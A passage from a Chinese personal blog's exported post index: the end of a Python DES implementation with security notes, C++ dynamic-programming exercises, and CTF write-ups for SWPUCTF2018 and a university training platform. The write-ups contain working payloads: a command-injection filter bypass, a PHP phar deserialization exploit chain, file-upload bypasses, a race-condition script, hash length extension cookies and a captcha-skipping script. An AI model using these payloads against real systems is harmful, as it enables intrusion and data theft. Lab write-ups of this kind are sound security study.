21, 10, 3, 24]\n\tre = \"\"\n\tfor i in range(32):\n\t\tre  += data[p[i]]\n\treturn re\n\n\n# F函数，32位数据，子秘钥，轮数\ndef f_function(data, key, round):\n\tcipher = data   # 左侧32位\n\tcipher = e_replace(cipher)\n\tcipher = secret_plus(cipher, key)\n\tcipher = s_replace(cipher)\n\tcipher = p_replace(cipher)\n\treturn cipher\n\ndef convert_key_bin(key):\n\tword = key\n\tkey = \"\"\n\tfor i in word:\n\t\tkey += f'{bin(ord(i))[2:]:0>8}'\n\treturn key\n\n# 终极加密函数，参数为秘钥和明文(明文暂时测试为64位以内)\ndef des_encrypt(ptext, key):\n\tfor i in range(17):\n\t\tl[i] = \"\"\n\t\tr[i] = \"\"\n\tkey = convert_key_bin(key)\n\tcipher = init_replace(ptext)\n\tl[0] = cipher[0:32]\n\tr[0] = cipher[32:]\n\t# 进行16层循环\n\tfor i in range(1,16):\n\t\tl[i] = r[i-1]\n\t\tsecret_key = generate_secretkey(key,i) # 生成子秘钥\n\t\tf_result = f_function(r[i-1],secret_key,i)\n\t\tfor j in range(32):\n\t\t\tr[i] += str(int(l[i-1][j])^int(f_result[j]))\n\tsecret_key = generate_secretkey(key,16)\n\tf_result = f_function(r[15],secret_key,16)\n\tl[16] = \"\"\n\tfor j in range(32):\n\t\tl[16] += str(int(l[15][j])^int(f_result[j]))\n\tr[16] = r[15]\n\ttemp = l[16] + r[16]\n\tfinal_cipher = \"\"\n\tfor i in range(64):\n\t\tfinal_cipher += temp[_ip[i]]\n\treturn f'{hex(int(final_cipher,2))[2:]:0>16}'\n\ndef des_decrypt(cipher,key):\n\tfor i in range(17):\n\t\tl[i] = \"\"\n\t\tr[i] = \"\"\n\n\t# 恢复为64位密文\n\tkey = convert_key_bin(key)\n\ttemp = bin(int(cipher, 16))[2:]\n\tcipher = \"0\"*(64-len(temp)) + temp\n\tcipher = init_replace(cipher)\n\tl[16] = cipher[:32]\n\tr[16] = cipher[32:]\n\tfor i in range(16,1,-1):\n\t\tl[i-1] = r[i]\n\t\tsecret_key = generate_secretkey(key,i) # 生成子秘钥\n\t\tf_result = f_function(r[i],secret_key,i)\n\t\tr[i-1] = \"\"\n\t\tfor j in range(32):\n\t\t\tr[i-1] += str(int(l[i][j])^int(f_result[j]))\n\tr[0] = r[1]\n\tsecret_key = generate_secretkey(key,1)\n\tl[0] = \"\"\n\tf_result = f_function(r[1],secret_key,1)\n\tfor j in range(32):\n\t\tl[0] += str(int(l[1][j])^int(f_result[j]))\n\ttemp = l[0] + r[0]\n\tbintext = \"\"\n\tfor i in range(64):\n\t\tbintext += temp[_ip[i]]\n\tplaintext = \"\"\n\tfor i in range(8):\n\t\tplaintext += chr(int(bintext[8*i:8*i+8],2))\n\treturn plaintext\n\ndef str2bin(text):\n\tif len(text) % 8 != 0:\n\t\ttext = text + \" \"*(8-(len(text)%8))\n\tbinplain = \"\"\n\tfor i in text:\n\t\tbinplain += '{:0>8}'.format(bin(ord(i))[2:])\n\treturn binplain\n\n\ndef encrypt(text, key):\n\tlongbinplain = str2bin(text)\n\tgroup_plain = \"\"\n\tlongcipher = \"\"\n\tfor i in range(len(longbinplain)//64):\n\t\tgroup_plain = \"\"\n\t\tgroup_plain = longbinplain[64*i:64*i+64]\n\t\tlongcipher += des_encrypt(group_plain,key)\n\treturn longcipher\t\n\ndef decrypt(cipher,key):\n\tplaintext = \"\"\t\n\tfor i in range(len(cipher)//16):\n\t\tplaintext += des_decrypt(cipher[16*i:16*i+16], key)\n\treturn plaintext.rstrip()\n\nif __name__ == '__main__':\n\tmode =  sys.argv[1]\n\twhile mode in (\"e\",\"d\"):\n\t\tdata = input(\"Plz input data: \")\n\t\tkey = str(input(\"Plz input key: \"))\n\t\tif mode == \"e\":\n\t\t\tans = encrypt(data, key)\n\t\t\tprint(ans)\n\t\telif mode == \"d\":\n\t\t\tans = decrypt(data, key)\n\t\t\tprint(ans)\n\t\tmode = input(\"quit or continue?\\n\")\n```\n\n为了增强通用性，增加代码重用性，该算法使用了包封装，从而使其能够被其它程序重用。该DES支持短信息加密，也支持长消息加密。为了使密文便于显示和存储转化为16进制显示\n\n*实例演示：*\n\n![demo](crypto1/4.png)\n\n*安全性分析*\n\n​\tDES算法具有极高的安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。 而56位长的密钥的穷举空间为2^56，这意味着如果一台计算机的速度是每一秒钟检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的。然而，这并不等于说DES是不可破解的。而实际上，随着硬件技术和Internet的发展，其破解的可能性越来越大，而且，所需要的时间越来越少。使用经过特殊设计的硬件并行处理要几个小时。\n\n​\t由DES算法的密钥生成步骤中我们可以看到：DES算法中只用到64位密钥中的其中56位，而第8、16、24、......64位8个位并未参与DES运算，这一点，向我们提出了一个应用上的要求，即DES的安全性是基于除了8，16，24，......64位外的其余56位的组合变化256才得以保证的。因此，在实际应用中，我们应避开使用第8，16，24，......64位作为有效数据位，而使用其它的56位作为有效数据位，才能保证DES算法安全可靠地发挥作用。如果不了解这一点，把密钥Key的8，16，24，..... .64位作为有效数据使用，将不能保证DES加密数据的安全性，对运用DES来达到保密作用的系统产生数据被破译的危险，这正是DES算法在应用上的误区，留下了被人攻击、被人破译的极大隐患。\n\n​\t此外，由于DES算法各轮（F函数）的子密钥是通过改变初始密钥这种方式得到的，因此有些初始密钥成了弱密钥（weakkey）。初始密钥分成两部分，每部分各自独立的移动。如果每一部分的所有位都是0或1，那么算法的任意一个周期的密钥都是相同的。当密钥是全1、全0、或者一半全1、一半全0时，会发生这种情况。所以*我们在选择密钥时要进行检查，以防止产生弱密钥*。\n\n​\t随着密码学的发展，差分分析和线性分析的发展对分组密码的安全性构成了挑战，也推动了分组密码设计技术的发展。\n\n​\t随着计算机计算能力的提高与密码分析技术的进步，DES的密钥长度已经被证明不能够满足当前安全性能的需求，为了克服DES密钥空间小的缺陷，人们又提出了三重DES的变形形式，即使用多个不同的DES秘钥利用DES算法对明文进行多次加密，这样可以增加密钥量。\n\n*算法实用性分析*\n\n​\tDES算法拥有着良好的安全性，目前最有效的破解方法依然是穷举攻击，所以在一些安全性要求相对不高的情况下可以使用DES算法，此外，由于DES的广泛的使用量，为了充分利用有关DES的软硬件资源，可以使用DES的改进算法如三重DES算法等。\n\n​\t由于DES算法要进行多轮迭代，所以DES的运算速度相对较慢，此外，密码生命周期也比较短。\n\n********\n\n​\t分组密码与序列密码相比，具有扩散性好，插入敏感等优点，缺点是加解密处理速度慢、存在错误传播。用途上，在对于处理数据分组的应用，比如文件传递、电子邮件，分组密码非常合适。 \n\n","tags":["Crypto"],"categories":["Record"]},{"title":"简单算法记录","url":"/2019/01/01/suanfa/","content":"\n\n# 前言\n\n最近在刷oj，感觉自己菜的抠脚，算法也不是很熟悉，需要加强一下，正好也为了后面的oj测试准备一下\n\n<!--more-->\n\n# 动态规划\n\n## 最长公共子序列\n\n> 题目描述\n给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。\n例如：Z=<a,b,f,c>是序列X=<a,b,c,f,b,c>的一个子序列，Z中的元素在X中的下标序列为<1,2,4,6>。\n现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？\n>\n> 输入\n输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。\n\n> 输出\n对于每组输入，输出两个字符串的最长公共子序列的长度。\n\n最长公共子序列问题，递推公式为\n\n![](suanfa/1.png)\n\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\nstring x;\nstring y;\nint b[105][105],c[105][105];\nvoid LCSLength(int m, int n){\n\tfor(int i=0;i<=m;i++) c[i][0] = 0;\n\tfor(int i=0;i<=n;i++) c[0][i] = 0;\n\tfor(int i=0;i<m;i++)\n\t\tfor(int j=0;j<n;j++){\n\t\t\tif(x[i]==y[j]){\n\t\t\t\tc[i][j] = c[i-1][j-1] + 1;\n\t\t\t\tb[i][j] = 1;\n\t\t\t}else if(c[i-1][j]>c[i][j-1]){\n\t\t\t\tc[i][j] = c[i-1][j];\n\t\t\t\tb[i][j] = 2;\t\t\t\t\n\t\t\t}else{\n\t\t\t\tc[i][j] = c[i][j-1];\n\t\t\t\tb[i][j] = 3;\n\t\t\t}\n\t\t}\n}\n//寻找最优解\nvoid traceback(int i,int j){\n\tif(i==-1||j==-1) return;\n\tif(b[i][j]==1){\n\t\tcout<<x[i];\n\t\ttraceback(i-1,j-1);\t\n\t} \n\telse if(b[i][j]==2) traceback(i-1,j);\n\telse traceback(i,j-1);\n}\nint main(){\n\twhile(cin>>x>>y){\n\t\tint a = x.length();\n\t\tint b = y.length();\n\t\tLCSLength(a,b);\n\t\tcout<<c[a-1][b-1]<<endl;\n\t\ttraceback(a-1, b-1);\n\t\tcout<<endl;\n\t}\n\treturn 0;\n} \n```\n\n## 最大字段和\n\n> 题目描述\n给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。\n\n> 输入\n包含多组测试数据。第一行为一个整数T(1<=T<=20)，代表测试数据个数。\n每组测试数据第一行为一个整数n，代表有n个整数(1<=n<=10000)。\n接下来一行有n个数x(-1000<=x<=1000)。\n\n>输出\n输出其对应的最大子段和。\n\n递推公式\n\n```\nb[i] = max{b[i-1]+a[i], a[i]}  (1≤i≤n)\n```\n\n```cpp\n#include<iostream>\nint num[10005];\nusing namespace std;\n//再给出输出最优解的方法\nint temp_start,len;\nint besti,bestj;\nvoid get_res(){\n\tfor(int i=besti;i<bestj;i++){\n\t\tcout<<num[i]<<\" \";\n\t}\n\tcout<<endl;\n}\nint main(){\n\tint t,n;\n\tint b = 0;\n\tint ans =0;\n\tcin>>t;\n\twhile(t>0){\n\t\tcin>>n;\n\t\tfor(int i=0;i<n;i++){\n\t\t\tcin>>num[i];\n\t\t}\n\t\ttemp_start = 0;\n\t\tlen = 1;\n\t\tfor(int i=0;i<n;i++){\n\t\t\tif(b>0){\n\t\t\t\tb = b + num[i];\n\t\t\t\tlen++;\n\t\t\t}else{\n\t\t\t\tb = num[i];\n\t\t\t\ttemp_start = i;\n\t\t\t\tlen = 1;\n\t\t\t}\n\t\t\tif(ans < b){\n\t\t\t\tans = b;\n\t\t\t\tbesti = temp_start;\n\t\t\t\tbestj = temp_start + len;\n\t\t\t}\n\t\t}\n\t\tcout<<ans<<endl;\n\t\t//get_res();\n\t\tt--;\n\t}\n\treturn 0;\n} \n```\n\n## 矩阵连乘\n\n待续\n\n## 0-1背包\n\n> 题目描述\n已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。\n> \n> 输入\n包含多组测试数据。第一行为一个整数T(1<=T<=10)，代表测试数据个数。\n\n> 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C<10000)和物品个数N(N<1000)。接下来的N行分别为物品的重量cost(1<=cost<=100)和价值val(1<=val<=3000000)。（注意：结果可能超过int范围）\n\n> 输出\n对每组测试数据，输出其对应的所装物品的最大价值。\n\n![递推公式](cumtctf/2.png)\n\n```cpp\n#include<iostream>\n#include<algorithm>\nusing namespace std;\nint c,n;\nint x[1005];\nlong w[1005];\nlong v[1005];\nlong long m[1005][10005];//数组长度要开的合适一点\nvoid pack(){\n\tfor(int i=0;i<w[n];i++) m[n][i] = 0;\n\tfor(int i=w[n];i<=c;i++) m[n][i] = v[n];\n\tfor(int i=n-1;i>0;i--){\n\t\tfor(int j=0;j<w[i];j++) m[i][j] = m[i+1][j];\n\t\tfor(int j=w[i];j<=c;j++){\n\t\t\tm[i][j] = max(m[i+1][j],m[i+1][j-w[i]]+v[i]);\n\t\t}\n\t}\n}\n//利用m的下标的意义来构造最优解 \nvoid traceback(){\n\tfor(int i=1;i<=n;i++){\n\t\tif(m[i][c]!=m[i+1][c]){\n\t\t\tcout<<i<<\" \";\n\t\t\tc -= w[i];\n\t\t}\n\t} \n\tcout<<endl;\n} \nint main(){\n\tint t;\n\tcin>>t;\n\twhile(t--){\n\t\tcin>>c>>n;\n\t\tfor(int i=1;i<=n;i++) cin>>w[i]>>v[i]; \n\t\tpack();\n\t\tcout<<m[1][c]<<endl;\n\t\t//traceback();\n\t}\n\treturn 0;\n}\n```","tags":["Algorithm"],"categories":["Record"]},{"title":"SWPUCTF2018复现","url":"/2018/12/20/SWPUCTF2018/","content":"\n题目复现\n\n<!--more-->\n\n# MISC\n\n其它两道都很简单，就不记录了，只记录一下没做出来的\n\n## 唯有低头,才能出头\n\n做的时候知道是键盘加密，但是对于数字理解错误了，我以为是手机键盘的九键加密...，所以走远了，记录一下这种加密方法，对应于键盘的盲打手势对应字母\n\n```\n99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33\nlookatthekeyboard\n```\n\n<!-- swpuctf{lookatthekeyboard} -->\n\n# WEB\n\n## 用优惠码 买个 X?\n\n注册并登录之后，页面弹出一个优惠码 `uKnfZ2F0aFaZBFy` ，但是输入之后却失效，要求我们输入24位的优惠码，题目存在文件泄露 `www.zip`，下载源码\n\n```php\n<?php\n//生成优惠码\n$_SESSION['seed']=rand(0,999999999);\nfunction youhuima(){\n\tmt_srand($_SESSION['seed']);\n    $str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n    $auth='';\n    $len=15;\n    for ( $i = 0; $i < $len; $i++ ){\n        if($i<=($len/2))\n              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);\n        else\n              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);\n    }\n    setcookie('Auth', $auth);\n}\n//support\n\tif (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip)){\n        if (!preg_match(\"/\\?|flag|}|cat|echo|\\*/i\",$ip)){\n               //执行命令\n        }else {\n              //flag字段和某些字符被过滤!\n        }\n\t}else{\n             // 你的输入不正确!\n\t}\n?>\n```\n\n可以看出题目使用了md_srand()函数来产生随机数，而PHP中产生的是伪随机数，即只要我们知道种子的话，那么后续产生的随机数我们也就都可以知道，所以现在就是要爆破随机数种子，可以用php_me_seed工具来爆破，速度快一些，但是我们要先将数据处理为该工具能够识别的输入参数\n\n```php\n$pass = \"b1o2OrrgqYPMkzK\";\n$str_rand = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$len = strlen($str_rand) -1;\nfor ($i=0; $i<strlen($pass); $i++){\n\tif($i<=(15/2)){\n\t\t$number = strpos($str_rand,$pass[i]);\n\t\techo \"$number $number 0 $len\";\n\t}else{\n\t\t$number = $len + 1 - strpos($str_rand,$pass[i]);\n\t\techo \"$number $number 0 $len\";\n\t}\n}\n```\n\n这样可以得到我们爆破的种子\n\n![](SWPUCTF2018/1.png)\n\n然后用该种子来生成24位的优惠码（这儿当时想不通哪来的24位，原来就是把代码中长度15改为24就可以了Orz）,此时注意php版本不同的话相同的种子也会产生不同的序列，看网站响应头可知该网站php版本为7.2，所以用对应版本生成优惠码即可\n\n然后就是后半段的命令执行绕过了\n\n```php\n//support\n\tif (preg_match(\"/^\\d+\\.\\d+\\.\\d+\\.\\d+$/im\",$ip)){\n        if (!preg_match(\"/\\?|flag|}|cat|echo|\\*/i\",$ip)){\n               //执行命令\n        }else {\n              //flag字段和某些字符被过滤!\n        }\n\t}else{\n             // 你的输入不正确!\n\t}\n```\n\n对于第一个首尾匹配直接 `%0a` 换行即可绕过，第二个过滤了通配符，flag字段，可以用单引号绕过，cat命令不能用了就用tail命令即可\n\n```\nip=1.1.1.1%0atail /'fl'ag\n```\n\n方方土学长用的是`\\`绕过，原理是反斜杠会转义特殊字符，而如果字符不是shell特殊字符的话则不转义\n\n```\nip=1.1.1.1%0atail /fl\\ag\n```\n\n## SimplePHP\n\n查看文件出存在文件读取漏洞，利用该漏洞读取文件源码，\n\n```bash\nhttp://120.79.158.180:11115/file.php?file=index.php\n```\n\n关键源码如下\n\nfunction.php\n\n```php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\nfile.php\n\n```php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} \n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\nclass.php\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n看到出现了类，思路就基本上是php反序列化了，但是代码中并没有反序列化函数的调用，但是在file.php中看到存在file_exists()函数，该函数是可以通过phar协议实现反序列化的[参考文章](https://www.freebuf.com/company-information/187071.html)，接下里的思路就是构造pop链，题目中有提示 `<!--flag is in f1ag.php-->` ，所以要尝试读取f1ag.php文件\n\n在Show类的__show方法中过滤了f1ag字段，那么这个方法应该不行，看了大佬的pop链构造思路，Test类中有file_get_contents()函数可以读取文件内容，所以可以尝试反序列化Test类，file_get()方法被get方法调用，而get方法是被__get()魔术方法调用\n\n>  当读取不可访问属性的值时，\\_\\_get() 会被调用。也就是，当想要获取一个类的私有属性，或者获取一个类并为定义的属性时。该魔术方法会被调用。 \n\n可以看到我们需要访问一个不可访问的变量，在Show中的__toString()方法中，运行了 `$content = $this->str['str']->source;`，该语句会访问不存在的变量source，所以接下来就是要触发__toString()方法，正好在C1e4r类中__destruct()类中 `echo $this->test;` 则会触发__toString()方法，至此pop链构造完成:\n\n```\n1.C1e4r类的__destruct()中的echo $this->test;\n2.Show中的__toString()中的$content = $this->str['str']->source;\n3.Test中的__get()方法\n4.利用file_get_contens()读文件\n```\n\n```php\n$a = new Test();\n$a->params = array(\"source\"=>'/var/www/html/f1ag.php');\n$b = new Show('index.php');\n$b->str['str'] = $a;\n$c= new C1e4r($b);\necho serialize($c);\n$obj = unserialize('O:5:\"C1e4r\":2:{s:4:\"test\";N;s:3:\"str\";O:4:\"Show\":2:{s:6:\"source\";s:9:\"index.php\";s:3:\"str\";a:1:{s:3:\"str\";O:4:\"Test\":2:{s:4:\"file\";N;s:6:\"params\";a:1:{s:6:\"source\";s:22:\"/var/www/html/f1ag.php\";}}}}}');\n$phar = new Phar('exploit.phar');\n$phar->startBuffering();\n$phar->addFromString('test.php', 'test');\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($obj);\n$phar->stopBuffering();\nrename('exploit.phar', 'skyfuck.gif');\n```\n\n然后提交即可\n\n```\nphar://upload/680b7502eaac53cac3f3eca74d50f537.jpg\n```\n\n<!-- SWPUCTF{Php_un$eri4liz3_1s_Fu^!} -->\n\n","tags":["CTF","Web","Misc"],"categories":["复现"]},{"title":"CUMT网络安全实训平台题目记录","url":"/2018/12/07/cumtctf/","content":"\nCUMT网络安全实训平台题目记录\n\n<!--more-->\n\n# WEB\n\n## 源代码\n\n查看源代码，在最后发现一段字符\n\n```\n<!--该f配l合a你g演{出y的o我u演f视i而n不d见m别e逼2一3个3最3爱3你3的3人3即3兴3表3演}-->\n```\n\n提取出字符即可得到flag\n\n## colorSnake\n\n前端题目，一头雾水，看了别人的wp，查看源代码在页面地段可以看到有一个game.js，跟过去看一下，\n\n```java\nxhr('./getScore.php',function(e){\n                var r = JSON.parse(e);\n                if(r.state == 200)\n                    game.addScore(r.score);\n                else{\n                    alert(r.msg);\n                    game.start()\n                }\n            })\n```\n\n尝试在控制台提交\n\n```\nsetInterval(function(){xhr('./getScore.php',function(e){\n                var r = JSON.parse(e);\n                if(r.state == 200)\n                    game.addScore(r.score);\n                else{\n                    alert(r.msg);\n                    game.start()\n                }\n            })},1)\n```\n\n会发现id确实增加了，我们可以通过修改参数使它实现多次递增从而达到50分，最终payload\n\n```\nsetInterval(function(){xhr('./getScore.php',function(e){\n                var r = JSON.parse(e);\n                if(r.state == 200)\n                    game.addScore(r.score);\n                else{\n                    alert(r.msg);\n                    game.start()\n                }\n            })},1000)\n```\n\n## 备份\n\n题目给出了信息\n\n> 1.bak 2.bak There are too much baks in the website ,can you find the flag in these baks?\n\n尝试访问1.bak，2.bak，没有发现flag，继续访问3.bak，4.bak等都存在文件，只是没有flag，猜测flag应该在某个\\*.bak，中，bp爆破一下，在998.bak中发现了flag\n\n## 上传一\n\n题目要求上传jpg后缀，写一个PHP文件修改后缀为jpg，之后抓包修改文件名后缀为PHP再发包（因为它是在前端验证文件是否合法）\n\n![payload](cumtctf/2.png)\n\n之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..）\n\n![result](cumtctf/3.png)\n\n## 自动获取flag程序\n\n题目说了要修改一下程序，查看源代码\n\n```java\n// 请求参数一\n$(\"#a\").click(function(){\n    $.ajax({\n        url:'param1.php',\n        method:'get',\n        dataType:'json',\n        success:calParam2\n    })\n});\nfunction calParam2(d){\n    var data=JSON.parse((d.param));\n    var length=data.length;\n    var second=new Date().getSeconds();\n    var sum=0;\n    for (var i = 1; i < length; i++) {\n        for (var j = 0; j < length/2; j++) {\n            sum+=parseInt(data[i])*second + data[j];\n        }\n    }\n    // 请求flag\n    $.ajax({\n        url:'http://new.ctf.param.com/aram2.php?sum='+sum,\n        method:'get',\n        dataType:'json',\n        success:function(s){\n            alert(s.f);\n\n        },\n        error:function(s){\n            alert('错了');\n        }\n    })\n}\n```\n\n看到有个param1.php的请求，访问一下得到\n\n```\n{\"param\":\"[\"1\",\"6\",\"2\",\"8\",\"4\",\"2\",\"8\",\"4\",\"9\",\"1\",\"10\"]\"}\n```\n\n\n\n<!-- flag{hello,This is A Gift FoRm PHP&JS; O(∩_∩)O~} -->\n\n## Cookie？\n\n查看cookie发现user值为guest，改为admin再刷新即可\n\n![result](cumtctf/5.png)\n\n一看就是维吉尼亚密码，解密一下就可以了\n\n<!-- flag{thisisanoldencrypt}<-->\n\n## 上传二\n\n见上传一\n\n## logic\n\n查看源代码可以发现\n\n![](cumtctf/1.png)\n\n应该是存在vim泄漏，尝试访问 `submit.php.swp` 发现泄漏文件，关键代码如下\n\n```php\nif(!empty($token)&&!empty($emailAddress)){\n\tif(strlen($token)!=10) die('fail');\n\tif($token!='0') die('fail');\n\t$sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\";\n\t$r = mysql_query($sql) or die('db error');\n\t$r = mysql_fetch_assoc($r);\n\t$r = $r['num'];\n\tif($r>0){\n\t\techo $flag;\n\t}else{\n\t\techo \"失败了呀\";\n\t}\n}\n```\n\n题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 `chenyurui@gmail.com` ，再提交一个`0e12345678` 即可。\n\n## 上传三\n\nbp抓包尝试不同的后缀，尝试 `phtml` 发现可以上传成功，即上传 `snow.phtml` ，题目返回信息\n\n![](cumtctf/6.png)\n\n可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题\n\n用burpsuite连续发包，在写个代码连续读取\n\n```python\nimport requests\nurl = \"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml\"\nwhile True:\n\tcontent = requests.get(url).text\n\tif \"flag\" in content:\n\t\tprint(content)\n```\n\n然后即可读到flag\n\n<!--flag{$$$_YOU_ARE_THE_BEST_GUY_HEIHEI_$$$}-->\n\n## is hash safe??\n\n题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令\n\n```bash\nvim -r amdin.php.swp\n```\n\n即可恢复出源代码，核心代码如下\n\n```php\n<?php\n$auth = false;\n$role = \"guest\";\n$salt =\"xxxxxxxxxxxxx\";//len:13\nif (isset($_COOKIE[\"role\"])) \n{\n        $role = $_COOKIE[\"role\"];\n        $hsh = $_COOKIE[\"hsh\"];\n        if (stripos($role,\"admin\")!==false&&$hsh === md5($salt.$_COOKIE[\"role\"])) \n        {\n                $auth = true;\n        }\n        else\n        {\n                $auth = false;\n        }\n} \nelse \n{\n        $s = $role;\n        setcookie('role',$s);\n        $hsh = md5($salt.$s);\n        setcookie('hsh',$hsh);\n}\nif ($auth) {\n        echo \"<h3>Welcome Admin.Your flag is cumtctf{you_know_this_is_not_the_flag}\";\n} else {\n        echo \"<h3>Only Admin can see the flag!!</h3>\";\n}\n?>\n```\n\n一看就是哈希长度扩展攻击\n\n[原理介绍](https://blog.csdn.net/syh_486_007/article/details/51228628)\n[工具介绍](https://www.cnblogs.com/pcat/p/5478509.html)\n\n我们可以用hashpump工具来做\n\n由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击\n\n![](cumtctf/4.png)\n\nInput signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为`len($salt)+len('gues')=17`，之后就会返回构造好的字符串和哈希值，把上面的`\\x`替换为`%`，之后修改cookie值，`role=>guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin`，`hsh=>37d0fe2c401a689be9608e9f850ef3de`，再刷新就可以得到flag了。\n\n<!--cumtctf{Md5_1s_n0t_safe} -->\n\n## 淘金\n\n这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人·\n\n```python\nimport requests\nimport time\nurl_post = r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'\nurl_get = r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='\ncookies={\"PHPSESSID\":\"2fle5nf7jrvi8lksme7uq0j1a3\",\"ssid\":\"a9598c3315159a39bbd981b8ec6fdb6d\"}   \ns = requests.session()\nnames = [\"bxsrc\",\"333\",\"08163266\",\"EddieIvan\"]\nids = [144,125,142,109]\nwhile True:\n    for i in range(len(names)):\n        data = \"user=\"+str(ids[i])+\"&num=1\"\n        req1 = s.get(url=url_get+str(ids[i]),cookies=cookies)\n        print(url_get+str(ids[i]))\n        req2 = s.post(url=url_post,cookies=cookies,data=data)\n    time.sleep(5)\n```\n\n\n\n## 听说你会面向对象\n\n题目给出了源代码，核心代码如下\n\n```php\n<?php\n//flag in flag.php\nclass Admin{\n    public $file = 'flag.php';\n    public function __construct($f)\n    {\n        $this->file = $f;\n    }\n    public function __wakeup()\n    {\n        // TODO: Implement __wakeup() method.\n        if (stripos($this->file,'flag')+1){\n                echo 'dangerrous';\n                $this->file = 'index.php';\n        }\n    }\n    public function 